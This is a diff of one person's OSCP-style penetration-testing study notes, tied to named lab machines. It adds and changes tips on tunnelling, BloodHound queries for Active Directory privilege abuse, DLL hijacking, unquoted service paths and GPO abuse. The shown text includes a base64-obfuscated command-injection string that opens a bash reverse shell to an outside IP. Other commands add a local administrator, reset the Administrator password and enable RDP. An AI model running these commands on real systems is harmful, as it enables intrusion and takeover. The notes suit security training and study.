@@ -2,6 +2,18 @@
 
 
 
+(ospg:dibble) good for mongodb commands
+https://kashz.gitbook.io/proving-grounds-writeups/pg-boxes/dibble/6-27017-mongodb
+
+nice reverse shell cheat sheet
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20an-d%20Resources/Reverse%20Shell%20Cheatsheet.md#nodejs
+------------------------
+(htb:mail)
+for the email they will either provide you:
+- the email technology used behind like mail outlook exploit (htb:mail)
+- or they will mention in the email the used technology (ospg:hepet)
+- or it will be general like knowing it is windows micros or more general library (offsec:2023)
+---------------------------------------------
 (ospg:kevin)
 nice way of generating msfvenom shell with no bad chars
 ----------------------------------
@@ -155,18 +167,19 @@ another one  that worked
 https://shivrajan.medium.com/use-command-line-tools-in-php-960214715b73
 ------------------------------------------------
 ligolo setup
-sudo ip tuntap add user kali mode tun ligolo
-sudo ip link set ligolo up
-sudo ip route add 240.0.0.1/32 dev ligolo
-sudo ip route add 10.10.139.0/24 dev ligolo
-
-sudo ip route add 240.0.0.1/32 dev pum
+sudo ip tuntap add user kali mode tun tits
+sudo ip link set tits up
+sudo ip route add 240.0.0.1/32 dev tits
+sudo ip route add 172.16.228.0/24/24 dev tits
 
 
 delete 
-sudo ip link set ligolo down
-sudo ip tuntap del dev ligolo mode tun
-sudo ip route del 10.10.139.0/24 dev ligolo
+sudo ip link set sus down
+sudo ip tuntap del dev sus mode tun
+sudo ip route del 240.0.0.1/32 dev sus
+sudo ip route del 10.10.111.0/24 dev sus
+sudo ip route del 172.16.228.0/24 dev sus
+
 
 
 MATCH (n)
@@ -178,8 +191,10 @@ RETURN u;
 ----------------------------------------
 (ospg:hokkaido) nice box to know  how the exam will be harder and more tricky in knowing the group specifics like finding genericwrite with generic query search and IT guesing it can forcefully change the password. also nice box for mssql commands and reseting the password with setuserinfo2
 
-MATCH (attackerGroup:User)-[r:GenericAll|GenericWrite|WriteOwner|WriteDacl|AllExtendedRights|ForceChangePassword|AddMember|AddSelf|AddKeyCredentialLink|Owns|WriteSPN|ReadLAPSPassword|ReadGMSAPassword]->(target)
-WHERE target:User OR target:Group OR target:Computer
+for some reason this worked with the medtech the one below it  did not
+
+MATCH (attackerGroup:User)-[r:GenericAll|GenericWrite|WriteOwner|WriteDacl|AllExtendedRights|ForceChangePassword|AddMember|AddSelf|AddKeyCredentialLink|Owns|WriteSPN|ReadLAPSPassword|ReadGMSAPassword|DCSync|CanRDP|AdminTo]->(target)
+WHERE target:User OR target:Group OR target:Computer OR target:GPO
 RETURN
     attackerGroup.name AS AttackerGroup,
     target.name AS Target,
@@ -187,10 +202,12 @@ RETURN
     type(r) AS PermissionType,
     r.isacl AS IsACLBased  
 
+(offsec:secura) added target:GPO
+
 and this to even bypass the nested grouping
 MATCH (attackerUser:User)
-MATCH (attackerUser)-[:MemberOf*1..5]->(attackerGroup:Group)-[r:GenericAll|GenericWrite|WriteOwner|WriteDacl|AllExtendedRights|ForceChangePassword|AddMember|AddSelf|AddKeyCredentialLink|Owns|WriteSPN|ReadLAPSPassword|ReadGMSAPassword]->(target)
-WHERE (target:User OR target:Group OR target:Computer)
+MATCH (attackerUser)-[:MemberOf*1..5]->(attackerGroup:Group)-[r:GenericAll|GenericWrite|WriteOwner|WriteDacl|AllExtendedRights|ForceChangePassword|AddMember|AddSelf|AddKeyCredentialLink|Owns|WriteSPN|ReadLAPSPassword|ReadGMSAPassword|DCSync|CanRDP]->(target)
+WHERE (target:User OR target:Group OR target:Computer OR target:GPO)
   AND NOT attackerUser.name =~ "(?i)Administrator@.*"
 RETURN
     attackerUser.name AS AttackerUser,
@@ -228,6 +245,10 @@ WHERE NOT g.name =~ "(?i)Administrators@.*"
   AND NOT g.name =~ "(?i)Backup Operators@.*"
   AND NOT g.name =~ "(?i)Print Operators@.*"
   AND NOT g.name =~ "(?i)Server Operators@.*"
+  AND NOT g.name =~ "(?i)KEY ADMINS@.*"
+  AND NOT g.name =~ "(?i)ENTERPRISE KEY ADMINS@.*"
+
+
 RETURN 
     g.name AS AttackingGroup,
     c.name AS TargetGroup,
@@ -235,7 +256,7 @@ RETURN
 ORDER BY g.name
 
 MATCH (g:Group)-[r:GenericAll|GenericWrite|WriteOwner|WriteDacl|AllExtendedRights|ForceChangePassword|AddMember|AddSelf|AddKeyCredentialLink|Owns|WriteSPN|ReadLAPSPassword|ReadGMSAPassword]->(c)
-WHERE (c:User OR c:Group OR c:Computer) and NOT g.name =~ "(?i)Administrators@.*" 
+WHERE (c:User OR c:Group OR c:Computer OR c:GPO) and NOT g.name =~ "(?i)Administrators@.*" 
   AND NOT g.name =~ "(?i)Domain Admins@.*"
   AND NOT g.name =~ "(?i)Enterprise Admins@.*"
   AND NOT g.name =~ "(?i)Schema Admins@.*"
@@ -285,6 +306,7 @@ awk -F, '{for(i=65;i<=90;i++) printf "%s.%s\n", sprintf("%c", i), $1 }' generate
 (ospg:peppo and postfish) found default users should be tried with the same pass on ssh and smtp
 (htb:manager) use the user for user and pass smb
 (ospg:matrimony) if the dns setup reverse  it dig @192.168.179.171 -x 192.168.179.171
+(ospg:peppo) default creds for postgresql psql -h 192.168.197.60 -p 5432 -U postgres
 --------------------------------------------------
 (ospg:depreciated) good for graphql commands 
 ------------------------------------------------
@@ -533,6 +555,37 @@ cat users.txt | awk -F\\[ '{print $2}' | awk -F\\] '{print $1}' > final_user.txt
 [there are things you can do in this workstaions with this user that you can not do on the other workstations which will get you a domaion user]
 
 
+(offsec:medtech) 
+after modifing mofifiable executable waiting for a scheduler time if no trager check if you can restart as the scheduler may run every restart
+
+beside since modifying a folder is everything about dll hijacking, insecure service check them all
+(offsec:medtech:client02) even through i did not have access to get-service but the service name is the same as the executable so always try that for insecure service also using sc instead of net maybe
+
+also unqoute is mostly need more reqs
+-------------------------------------------------------
+OSCP A
+(offsec:Hermes)
+i was right that winpeas did not show me the service name that has the insecure service vulnerability that i have write permision over a service - also i found it thanks to god for understanding how to exploit  the dll hijack that made for me the rest easy 
+--------------------------------
+OSCP C
+(offsec:Frankfurt) you can in your search for exploit use dork keywords like
+"exploit" "rce" "standalone" "self-contained"
+
+(offsec:charlie) start pspy64 even if there is no crontabs //avoid misses
+
+(offsec:pascha)
+for the unqouted service use this powershell to get what is the service name
+Get-Service | Where-Object { $_.Status -eq 'Running' } | ForEach-Object { 
+    $config = sc.exe qc $_.Name 2>$null
+    if ($config -match "backup\.exe") { 
+        Write-Output "Service: $($_.Name)"
+        Write-Output $config
+        Write-Output "----------------------"
+    }
+}
+----------------------------------------------
+(offsec:oscpc) pass the ticket (TGT or TGS) is a nested perform
+----------------------------------
 (ospg:billyboss)
 like in the connect the port when there is website provided with its files in ftp means the website is for the specific there are commands normally gives access denied and being able to execute it give you some pre assumption like
 
@@ -548,6 +601,19 @@ dll hijacking types:
 - the dll of the service exists but the folder is writable by you (htb:analysis)
 - the dll actually does not exists so you search for the first writable PATH by you (ospg:jacko)
 
+this article mentioned the searching for the dll order
+https://infosecwriteups.com/privilege-escalation-in-windows-380bee3a2842
+1. The directory from which the application loaded
+2. 32-bit System directory (C:\Windows\System32)
+3. 16-bit System directory (C:\Windows\System)
+4. Windows directory (C:\Windows)
+5. The current working directory (CWD)
+6. Directories in the PATH environment variable (first system and then user)
+
+writtable environmental paths
+$i=1; (Get-ItemProperty "HKLM:\System\CurrentControlSet\Control\Session Manager\Environment").Path -Split ";" | % { try { [IO.File]::OpenWrite("$_\x.txt").Close(); Remove-Item "$_\x.txt" -EA 0; "[$i] [WRITABLE] $_"; $i++ } catch {} } | Select -First 1; (Get-ItemProperty "HKLM:\System\CurrentControlSet\Control\Session Manager\Environment").Path -Split ";" | ? { $_ -ne $writable } | % { "[$i] [NOT WRITABLE] $_"; $i++ }
+
+
 the analysis htb did snort dll hijacking did not have exploitdb writeup but the exploit found here
 http://hyp3rlinx.altervista.org/ so this is a lesson learned after me searching steps before idk level which is like searching the connect the port with general for authentication bypass we can search workstation specifics with like dork general or this dll hijack for the software installed
 --------------------------------------------
@@ -560,8 +626,12 @@ Get-NetGPO
 Get-GPPermission -Guid [of the gpo] -TargetType User -TargetName [your-user]
 wget https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.0_x64/SharpGPOAbuse.exe
 ./SharpGPOAbuse.exe --AddLocalAdmin --UserAccount anirudh --GPOName "Default Domain Policy"
+gpupdate /force
 ---------------------------------------------------------------------
 (ospg:vault) We cannot access the scheduled tasks but we still might be able to manipulate one. Let’s look at them. We want a task that is run by SYSTEM dir c:\windows\system32\tasks
+
+these are windows world writable folders
+https://gist.github.com/mattifestation/5f9de750470c9e0e1f9c9c33f0ec3e56
 
 abuse serestoreprivilege even if there is no RDP
 https://github.com/dxnboy/redteam/blob/master/SeRestoreAbuse.exe?source=post_page-----158516460860---------------------------------------
@@ -581,6 +651,12 @@ method of transferring files
 
 to avoid this issue 
 execute neo4j users command and count the rid users it must match in number
+
+(offsec:medtech) beside that using nxc ldap bloodhound make sure it really got all the computers to not happen to you like in medtech when i missed the users sessions
+ 
+WOWWW very interesting discovery the nxc and sharphound.exe collections was not like powershell which should hassession the others did not
+
+(offsec:medtech:client01) another trick where CanRDP group specifics and bloodhound did not show any RDP to client01
 ----------------------------------------------------------
 (ospg:posedeion) 
 interesting go by 
@@ -606,6 +682,12 @@ site:medium.com " .dsh" tryhackme
 find a way to execute stuff inside the machine as a pre-authenticated user so that we you are stuck from outside __like you exploited and inside the machine but does not have the user pass__
 __we performed these attack without access to the plaintext password or password hash of this user.__
 (offsec)
+
+good resource
+https://www.scribd.com/document/659712659/AD-and-windows-exploitation-cheat-sheet
+
+perform impersonate system in the same shell
+PrintSpoofer64.exe -i -c powershell.ex
 
 perform asreproast
 .\Rubeus.exe asreproast /nowrap
@@ -832,6 +914,9 @@ Get-MpPreference | Select-Object -ExpandProperty ExclusionPath
 
 -------------------------------------------------------------
 sometimes a running services in the system has features that  enables you to get root like the air2webui box (ospg:air)
+
+when there is a service running try to take the part of the port and the url directory path and dork
+with "curl" that could reveal tools
 -------------------------------------------------------
 ;echo${IFS}YmFzaCAtaSAgPiYgICAvZGV2L3RjcC8xOTIuMTY4LjQ1LjE2Ni80NDMgMD4mMSAK|base64${IFS}-d|bash;#
 # base64 command: bash -i >& /dev/tcp/192.168.45.166/443 0>&1
@@ -859,7 +944,8 @@ set PATH=%PATH%;C:\windows\system32;C:\windows;C:\windows\System32\Wbem;C:\windo
 ----------------------------------------------------------------------------------------
 allow rdp 
 
-gp4.exe -cmd "cmd /c net user mamathere P@ssword123 /add"
+gp4.exe -cmd "cmd /c net user administrator Test@123"
+
 gp4.exe -cmd "cmd /c net localgroup administrators /add mamathere"
 
 gp4.exe -cmd "cmd /c reg add \"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\" /v \"fDenyConnections\" /t REG_DWORD /d 0 /f"
